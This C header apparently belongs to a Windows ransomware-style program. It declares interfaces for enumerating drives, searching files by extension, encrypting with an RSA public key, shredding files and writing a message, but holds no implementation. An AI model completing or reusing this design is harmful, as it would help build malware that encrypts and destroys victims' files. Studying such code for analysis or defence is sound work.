/*
* MIT License
*
* Copyright (c) 2022 kadzicu
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#ifndef __def__h__
#define __def__h__

#include <time.h>
#include <stdio.h>
#include <tchar.h>
#include <shlobj.h> 
#include <windows.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

#include <openssl/rsa.h>
#include <openssl/pem.h>

/////////////////////////////////////////////////////////////////////////////////////////////
typedef struct
{
    _TCHAR** listOfLogicalDrives;
    int numberOfLogicalDrives;
    int maxNumberOfLogicalDrives;
} logical_drive_class_variables_t;

typedef struct
{
    void(*ld_destroy)(struct logical_drive_class_t*);
    _TCHAR** (*get_var_list_of_logical_drives)(struct logical_drive_class_t*);
    int(*get_var_number_of_logical_drives)(struct logical_drive_class_t*);
    int(*get_var_max_number_of_logical_drives)(struct logical_drive_class_t*);
} logical_drive_class_methods_t;

typedef struct
{
    void* impl_;
    logical_drive_class_methods_t* method;
} logical_drive_class_t;
/////////////////////////////////////////////////////////////////////////////////////////////
typedef struct
{
    _TCHAR** arrayOfFileExtensions;
    size_t fileExtensionArraySize;
} search_engine_class_variables_t;

typedef struct
{
    void(*se_destroy)(struct search_engine_class_t*);
    void(*se_start)(struct search_engine_class_t*);
} search_engine_class_methods_t;

typedef struct
{
    void* impl_;
    search_engine_class_methods_t* method;
} search_engine_class_t;
/////////////////////////////////////////////////////////////////////////////////////////////
typedef struct
{
    FILE* file;
    LONG64 fileSize;
    LPCTSTR path;
    int errorSuccess;
} open_close_file_class_variables_t;

typedef struct
{
    void(*ocf_destroy)(struct open_close_file_class_t*);
    void(*ocf_open_file_rb)(struct open_close_file_class_t*);
    void(*ocf_open_file_r)(struct open_close_file_class_t*);
    void(*ocf_open_file_wb)(struct open_close_file_class_t*);
    void(*ocf_open_file_rwb)(struct open_close_file_class_t*);
    int(*get_var_error_success)(struct open_close_file_class_t*);
    FILE*(*get_var_file)(struct open_close_file_class_t*);
    LONG64(*get_var_file_size)(struct open_close_file_class_t*);
} open_close_file_class_methods_t;

typedef struct
{
    void* impl_;
    open_close_file_class_methods_t* method;
} open_close_file_class_t;
/////////////////////////////////////////////////////////////////////////////////////////////
typedef struct
{
    LPCTSTR path;
} file_shredder_class_variables_t;

typedef struct
{
    void(*fs_destroy)(struct file_shredder_class_t*);
    void(*fs_start)(struct file_shredder_class_t*);
} file_shredder_class_methods_t;

typedef struct
{
    void* impl_;
    file_shredder_class_methods_t* method;
} file_shredder_class_t;
/////////////////////////////////////////////////////////////////////////////////////////////
typedef struct
{
    LPCTSTR path;
    _TCHAR** msg;
    size_t msgSize;
} message_class_variables_t;

typedef struct
{
    void(*m_destroy)(struct message_class_t*);
    void(*m_send)(struct message_class_t*);
} message_class_methods_t;

typedef struct
{
    void* impl_;
    message_class_methods_t* method;
} message_class_t;
/////////////////////////////////////////////////////////////////////////////////////////////
typedef struct
{
    RSA* publicKey;
    FILE* pemFile;
    LPCTSTR path;
} rsa_class_variables_t;

typedef struct
{
    void(*rsa_destroy)(struct rsa_class_t*);
    void(*rsa_encrypt)(struct rsa_class_t*);
    void(*read_pem_file)(struct rsa_class_t*);
} rsa_class_methods_t;

typedef struct
{
    void* impl_;
    rsa_class_methods_t* method;
} rsa_class_t;
/////////////////////////////////////////////////////////////////////////////////////////////
#endif // !__def__h__
